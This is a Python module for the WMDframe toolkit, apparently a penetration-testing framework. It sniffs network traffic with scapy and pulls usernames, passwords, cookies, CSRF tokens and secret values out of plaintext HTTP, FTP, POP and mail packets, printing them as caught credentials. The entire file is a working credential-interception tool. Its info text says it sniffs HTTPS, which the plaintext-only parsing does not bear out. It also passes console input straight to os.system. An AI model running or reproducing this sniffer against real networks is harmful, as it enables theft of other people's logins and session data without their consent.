#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
# Module for WMDframe


import argparse
import sys              # Exit script
import os               # Clear screen
import re               # Find * in packet
import time             # Timestamp loggings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
from scapy.all import sniff, IP, TCP, DNS, Raw      # Tools from scapy
try:
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc
except:
    # Running module outside the WMDframe might require path changing to import core modules
    # import sys
    sys.path.append('././')
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc


# ==========================
# Parser START
# ==========================
parser = argparse.ArgumentParser()
# parser.add_argument('-ip', '--lanip', help='IP to monitor', metavar='IP') # Example. Use with "args.lanip"
parser.add_argument('-r', '--run', action='store_true', help='Start monitoring')
args, unknown = parser.parse_known_args()
# ==========================
# Parser END
# ==========================


# ==========================
# Core START
# ==========================
config = core.config()
INTERFACE_NET = (config['NETWORK']['INTERFACE_NET'])

logger = core.log()
# logger.debug('Starting module')
# ==========================
# Core END
# ==========================


# ==========================
# Log files, global variables, etc. START
# ==========================
gcookie = ''     # Global for not printing the same cookie multiple times
gsecret = ''    # Same for secret
global ignore
# =============
# Log files, global variables, etc. end
# ==========================


# OPTIONS
class Options():
    """Main class for module."""

    Author = 'Thomas TJ (TTJ)'
    Name = 'Sniff HTTP'
    Call = 'sniffhttp'
    Modulename = 'sniff_http'  # Filename
    Category = 'sniff'
    Type = 'http'
    Version = '0.1'
    License = 'MIT'
    Description = 'Sniff HTTP packages. Extract username and passwords from traffic.'
    Datecreation = '2017/02/01'
    Lastmodified = '2017/02/01'

    def __init__(self, interface_net, filter, creds, empty, ignore):
        """Define variables and show options on run."""
        self.interface = interface_net
        self.filter = filter
        self.creds = creds
        self.empty = empty
        self.ignore = ignore
        self.show_all()

    def poss_opt(self):
        """Possible options. These variables are checked when the user tries to 'set' an option."""
        return ('interface_net', 'filter', 'creds', 'empty', 'ignore')

    def show_opt(self):
        """Show the possible options."""
        print(
            ''
            '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 8, 'RQ', 18, 'VALUE', 'DESCRIPTION')) + bc.ENDC +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 8, '--', 18, '-----', '-----------')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'interface:', 8, 'y', 18, self.interface, 'Interface to listen on')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'filter:', 8, 'n', 18, self.filter, 'Filter (default=ALL)')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'creds:', 8, 'n', 18, self.creds, 'Only show creds')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'empty:', 8, 'n', 18, self.empty, 'Hide empty pkts')) +
            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'ignore:', 8, 'n', 18, self.ignore, 'Ignore js etc.')) +
            ''
        )
        print("""
         filter options
         -> [ALL]  Whatever
         -> [DNS]  Domains Name Service
         -> [FTP]  File Transfer Protocol
         -> [POP]  Post Office Protocol
         -> [HTTP] HTTP
         -> [MAIL] Mail (25, 110, 143)
         """)

    def show_commands(self):
        """Show the possible commands."""
        print(
            ''
            '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +
            '\n\t' + '---------' +
            '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'set', 'Set options, set [PARAMETER] [VALUE]')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module')) +
            '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit')) +
            '\n'
        )

    def show_all(self):
        """Show all options.

        Sending main options to the core module modules.py for parsing.
        """
        cmodules.showModuleData(
            Options.Author,
            Options.Name,
            Options.Call,
            Options.Category,
            Options.Type,
            Options.Version,
            Options.Description,
            Options.License,
            Options.Datecreation,
            Options.Lastmodified
        )
        self.show_commands()
        self.show_opt()
# END OPTIONS


def run():
    """The main run function."""
    interface = sop.interface
    pktfilter = sop.filter

    if sop.creds not in ('y', 'n'):
        print(bc.FAIL + '\t[-]  Wrong parameter in creds - only "y" and "n" is allowed.' + bc.ENDC)
        return None
    if sop.ignore not in ('y', 'n'):
        print(bc.FAIL + '\t[-]  Wrong parameter in ignore - only "y" and "n" is allowed.' + bc.ENDC)
        return None
    if sop.empty not in ('y', 'n'):
        print(bc.FAIL + '\t[-]  Wrong parameter in empty - only "y" and "n" is allowed.' + bc.ENDC)
        return None

    try:
        if pktfilter == 'DNS':
            FILTER = 'udp or port 53'
        elif pktfilter == 'FTP':
            FILTER = 'port 21'
        elif pktfilter == 'ALL':
            FILTER = 'udp or tcp'
        elif pktfilter == 'POP':
            FILTER = 'port 110'
        elif pktfilter == 'HTTP':
            FILTER = 'port 80 or 8080'
        elif pktfilter == 'MAIL':
            FILTER = 'port 25 or 110 or 143'
        else:
            print('Type not allow, using UDP or TCP.')
            FILTER = 'udp or tcp'
            return

        print(
            '\n  ' + bc.OKBLUE +
            ('TIME: %-*s ID:%-*sPRO:%-*sSRC: %-*s DST: %-*s PORT: %-*s HOST:  TYPE:  PATH:' % (4, '', 5, '', 3, '', 16, '', 16, '', 5, '')) +
            bc.ENDC
        )
        while True:
            sniff(filter=FILTER, prn=callback, store=0, iface=interface)
    except KeyboardInterrupt:
        sys.exit()


def callback(pkt):
    """Callback function for the sniffing."""
    # if pkt.dport == 53 and pkt[DNS].opcode == 0L and pkt[IP].proto == 17:
    if pkt.dport == 53 and pkt[IP].proto == 17:
        printable = (
            ' [' + time.strftime('%H:%M:%S') + '] ' +
            ('%-*s' % (6, str(pkt[IP].id))) + bc.HEADER + '  DNS   ' + bc.ENDC + (' SRC: %-*s DST: %s' % (16, str(pkt[IP].src), pkt[DNS].qd.qname)) + bc.ENDC
        )
        return printable

    # MAIL
    mailuserpass = ''
    if pkt.dport == 25 or pkt.dport == 110 or pkt.dport == 143:
        if pkt[TCP].payload:
            ftp_packet = str(pkt[TCP].payload)
            # Only interested in USER and PWD
            if sop.creds == 'y':
                if 'user' in ftp_packet.lower() or 'pass' in ftp_packet.lower():
                    printable = (
                        ' [' + time.strftime('%H:%M:%S') + '] ' +
                        ('%-*s' % (6, str(pkt[IP].id))) + bc.OKGREEN +
                        '  POP  ' + bc.ENDC + ' ' +
                        ('SRC: %-*s DST: %-*s' % (16, str(pkt[IP].src), 16, str(pkt[IP].dst))) +
                        '  DATA:  ' + bc.OKGREEN + str(pkt[TCP].payload).replace('\n', '.') + bc.ENDC
                    )
                    return printable

            if 'user' in ftp_packet.lower() or 'pass' in ftp_packet.lower():
                mailuserpass = ('DATA:  ' + bc.OKGREEN + str(pkt[TCP].payload).replace('\n', ' '))
            elif ftp_packet:
                mailuserpass = ('DATA:  ' + str(pkt[TCP].payload).replace('\n', ' '))
            else:
                try:
                    mailuserpass = ('DATA:  ' + str(pkt[Raw].load).replace('\n', ' '))
                except:
                    mailuserpass = ''

            printable = (
                ' [' + time.strftime('%H:%M:%S') + '] ' +
                ('%-*s' % (6, str(pkt[IP].id))) + bc.OKGREEN +
                '  POP  ' + bc.ENDC + ' ' +
                ('SRC: %-*s DST: %-*s' % (16, str(pkt[IP].src), 16, str(pkt[IP].dst))) + ' ' + mailuserpass + bc.ENDC
            )
            return printable

    # FTP
    userpass = ''
    if pkt.dport == 21:
        if pkt[TCP].payload:
            ftp_packet = str(pkt[TCP].payload)
            # Only interested in USER and PWD
            if sop.creds == 'y':
                if 'user' in ftp_packet.lower() or 'pass' in ftp_packet.lower():
                    printable = (
                        ' [' + time.strftime('%H:%M:%S') + '] ' +
                        ('%-*s' % (6, str(pkt[IP].id))) + bc.OKGREEN +
                        '  FTP   ' + bc.ENDC + ' ' +
                        ('SRC: %-*s DST: %-*s' % (16, str(pkt[IP].src), 16, str(pkt[IP].dst))) +
                        '  DATA:  ' + bc.OKGREEN + str(pkt[TCP].payload).replace('\n', '.') + bc.ENDC
                    )
                    return printable
            # Want it all
            else:
                if 'user' in ftp_packet.lower() or 'pass' in ftp_packet.lower():
                    userpass = ('DATA: ' + bc.OKGREEN + str(pkt[TCP].payload).replace('\n', ' '))
                elif ftp_packet:
                    userpass = ('DATA: ' + str(pkt[TCP].payload).replace('\n', ' '))
                else:
                    try:
                        userpass = ('DATA: ' + str(pkt[Raw].load).replace('\n', ' '))
                    except:
                        userpass = ''

                printable = (
                    ' [' + time.strftime('%H:%M:%S') + '] ' +
                    ('%-*s' % (6, str(pkt[IP].id))) + bc.OKGREEN +
                    '  FTP   ' + bc.ENDC + ' ' +
                    ('SRC: %-*s DST: %-*s' % (16, str(pkt[IP].src), 16, str(pkt[IP].dst))) + ' ' + userpass + bc.ENDC
                )
                return printable

    # HTTP
    # payload = ''
    host = ''
    username = ''
    password = ''
    cookie = ''
    path = ''
    post = ''
    secret = ''
    csrf = ''
    raw_dport = ''
    global gcookie
    global gsecret
    # if pkt.dport == 80 or pkt.dport == 8080:
    if True:
        try:
            raw_dport = str(pkt[TCP].dport)
        except:
            raw_dport = ''

        try:
            raw = str(pkt[Raw].show)
        except:
            raw = ''

        if raw == '':
            return None

        # Get username
        username = ''
        if 'user' in raw:
            mu = re.search('user[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
            if mu:
                username = str(mu.group(1))
        # Get password
        if 'pass' in raw or 'pwd' in raw:
            mp = re.search('pass[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
            if mp:
                password = str(mp.group(1))
            else:
                mp = re.search('pwd[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
                if mp:
                    password = str(mp.group(1))
            if password.isspace():
                password = ''

        # Get path
        if raw:
            mpath = re.search('\\\\r\\\\n\\\\r\\\\n([A-Za-z0-9%\.=&_-]+)', raw)  # b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
            if mpath:
                path = '  PATH: ' + str(mpath.group(1))

        # Get cookie
        if raw:
            mcookie = re.search('Cookie:\s([A-Za-z0-9%=&_-]+)\\\\r\\\\n', raw)  # b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
            if mcookie:
                cookie = '  COOKIE: ' + str(mcookie.group(1))
                if cookie == gcookie:
                    cookie = ''
                else:
                    gcookie = cookie
            else:
                mcookie = re.search('Cookie:\s([A-Za-z0-9%=&_-]+);', raw)  # b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
                if mcookie:
                    cookie = '  COOKIE: ' + str(mcookie.group(1))
                    if cookie == gcookie:
                        cookie = ''
                    else:
                        gcookie = cookie
            # Do a check for stupid cookies and ignore them
            # if 'Gdyn' or 'gscroll' in cookie:
            #   cookie = ''

        # Get host
        if raw:
            mhost = re.search('Host:\s([A-Za-z0-9%\.=&_-]+)\\\\r\\\\n', raw)  # b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
            if mhost:
                host = '  HOST: ' + str(mhost.group(1))

        # Get POST
        if raw:
            mpost = re.search('(POST.*[A-Za-z0-9%_-]+).HTTP', raw)  # b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
            if mpost:
                post = '  TYPE: ' + str(mpost.group(1))
            else:
                mpost = re.search('(GET.*[A-Za-z0-9%_-]+).HTTP', raw)
                if mpost:
                    post = '  TYPE: ' + str(mpost.group(1))

        # Get secret
        if raw:
            msecret = re.search('([A-Za-z0-9%=&_-]+secret[A-Za-z0-9%=&_-]+)', raw, re.IGNORECASE)  # b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
            if msecret:
                secret = '  SECRET: ' + str(msecret.group(1))
                if secret == gsecret:
                    secret = ''
                else:
                    gsecret = secret

        # Get CSRF
        if raw:
            mcsrf = re.search('csrf[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
            if mcsrf:
                csrf = '  CSRF: ' + str(mcsrf.group(1))

        if password:
            if sop.creds != 'y':
                printablecon = (
                    '\n' +
                    ' ' + bc.ENDC + '[' + time.strftime('%H:%M:%S') + ']' + bc.ENDC + ' ' + bc.OKGREEN + 'CREDS CATCHED:' + bc.ENDC +
                    '\n' + ' [' + time.strftime('%H:%M:%S') + '] ' + str(pkt[IP].id) +
                    '\n\t\t  ORIGIN:   ' + str(pkt[IP].src) +
                    '\n\t\t  SERVER:   ' + str(pkt[IP].dst) +
                    '\n\t\t  PORT:     ' + raw_dport +
                    bc.OKGREEN + '\n\t\t  USERNAME: ' + username + bc.ENDC +
                    bc.OKGREEN + '\n\t\t  PASSWORD: ' + password + bc.ENDC +
                    '\n\t\t  POST:     ' + post.replace('  TYPE: ', '') +
                    '\n\t\t  PATH:     ' + path.replace('  PATH: ', '') +
                    '\n\t\t  CSRF:     ' + csrf.replace('  CSRF: ', '') +
                    '\n\t\t  HOST:     ' + host.replace('  HOST: ', '') +
                    '\n\t\t  COOKIE:   ' + cookie.replace('  COOKIE: ', '') +
                    '\n\t\t  SECRET:   ' + secret.replace('  SECRET: ', '') +
                    '\n\n'
                )

            # Only CREDS
            if sop.creds == 'y':
                printablecon = (
                    '\n' +
                    ' ' + bc.ENDC + '[' + time.strftime('%H:%M:%S') + ']' + bc.ENDC + ' ' + bc.OKGREEN + 'CREDS CATCHED:' + bc.ENDC +
                    '\n ' + ' [' + time.strftime('%H:%M:%S') + '] ' + str(pkt[IP].id) +
                    '\n' +
                    bc.OKGREEN + '\n\t\t  ORIGIN  : ' + str(pkt[IP].src) + bc.ENDC +
                    bc.OKGREEN + '\n\t\t  USERNAME: ' + username + bc.ENDC +
                    bc.OKGREEN + '\n\t\t  PASSWORD: ' + password + bc.ENDC +
                    '\n\t\t  Path:     ' + path +
                    '\n'
                )

            return printablecon

        elif sop.creds == 'y':
            return None

        elif cookie or secret or csrf:
            return ' ' + bc.ENDC + '[' + time.strftime('%H:%M:%S') + ']' + bc.ENDC + ' ' + ('%-*s  Other  SRC: %-*s DST: %-*s PORT: %-*s' % (6, str(pkt[IP].id), 16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport)) \
                + host + post + path + bc.OKGREEN + cookie + secret + csrf + bc.ENDC

        elif 'login' in post.lower():
            return ' ' + bc.ENDC + '[' + time.strftime('%H:%M:%S') + ']' + bc.ENDC + ' ' + ('%-*s  Other  SRC: %-*s DST: %-*s PORT: %-*s' % (6, str(pkt[IP].id), 16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport)) \
                + host + bc.OKGREEN + post + path + bc.ENDC

        else:
            if sop.ignore == 'y':
                # Create for loop checking each user input ignore files instead of static
                # if re.search('(\.jpg)', post, re.IGNORECASE) is not None or re.search('(\.js)', post, re.IGNORECASE) is not None or re.search('(\.css)', post, re.IGNORECASE) is not None:
                if re.search('(\.jpg|\.js|\.css|\.jpeg|\.svg|\.png)', post, re.IGNORECASE) is not None:
                    return None

            if sop.empty == 'y':
                # if raw != '' or payload != '':
                if post != '':
                    return bc.ENDC + ' [' + time.strftime('%H:%M:%S') + '] ' + ('%-*s  Other  SRC: %-*s DST: %-*s PORT: %-*s' % (6, str(pkt[IP].id), 16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport)) + host + post + path
                else:
                    return None
            else:
                return bc.ENDC + ' [' + time.strftime('%H:%M:%S') + '] ' + ('%-*s  Other  SRC: %-*s DST: %-*s PORT: %-*s' % (6, str(pkt[IP].id), 16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport)) + host + post + path

    # Implement domain filtering for ignore ads
    # domainFilterList = ['adzerk.net', 'adwords.google.com', 'googleads.g.doubleclick.net', 'pagead2.googlesyndication.com']
    # except:n=None


def info():
    """Show the modules info - optional."""
    print("""
        Module for use in WMDframe.

        This module sniffs HTTPS data traffic and extract
        usernames, passwords, cookies and secret keys.
        The module on capture username and passwords, where the
        variables are named "*user*", "*pwd*" or "*password*". But
        if a URL contains "*login*", the URL will be printed.
        """)

    if parser.format_help():
        print('\n\t' + bc.OKBLUE + 'COMMANDLINE ARGUMENTS:' + bc.ENDC)
        for line in parser.format_help().strip().splitlines():
            print('\t' + line)
    print('')


# CONSOLE
def console():
    """The main console for the module."""
    value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'sniffHTTP:' + bc.ENDC + ' ')
    userinput = value.split()
    # Show options
    if 'so' in userinput[:1]:
        sop.show_opt()
    # Show all info
    elif 'sa' in userinput[:1]:
        sop.show_all()
    # Run module
    elif 'run' in userinput[:1]:
        run()
    # Set options
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')  # The parameter to set
        uservalue = str(userinput[2:3]).strip('[]\'')  # Use single word after "set parameter" to set parameter
        # uservalue = value.split(' ', 2)[2]  # Use all text after "set parameter"
        if useroption not in sop.poss_opt():
            print(bc.WARN + '\n    Error, no options for: ' + useroption + '\n' + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + '\n')
    # Open module in new window
    elif 'invoke' in userinput[:1]:
        comm.invokeModule(options.Call)
        return None
    # Go back to WMDframe console
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    # Run command
    elif ':' in userinput[:1]:
        print('')
        os.system(str(value[1:]))
        print('')
    # Show info
    elif 'info' in userinput[:1]:
        info()
    else:
        command = str(userinput[:1]).strip('[]\'')
        print(bc.WARN + '\n    Error, no options for: ' + command + '\n' + bc.ENDC)
    console()
# END console


def main():
    """The first function to run."""
    print('\n')
    print('\t   _____       _ ________   __  __________________   ')
    print('\t  / ___/____  (_) __/ __/  / / / /_  __/_  __/ __ \  ')
    print('\t  \__ \/ __ \/ / /_/ /_   / /_/ / / /   / / / /_/ /  ')
    print('\t ___/ / / / / / __/ __/  / __  / / /   / / / ____/   ')
    print('\t/____/_/ /_/_/_/ /_/    /_/ /_/ /_/   /_/ /_/        ')
    print('\n')
    if os.getuid() != 0:
        print('r00tness is needed due to sniff on interface!')
        print('Run the script again as root/sudo')
        return None
    # print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    # comm.checkNetConnectionV()
    # print('')
    global sop
    # The parameters to be passed to the module on run
    sop = Options(INTERFACE_NET, 'ALL', 'n', 'y', 'y')
    if args.run:
        run()
    else:
        console()


if args.run:
    main()


# For testing uncomment "main()", place module in root directory and run module with "python3 modulename.py"
#  main()
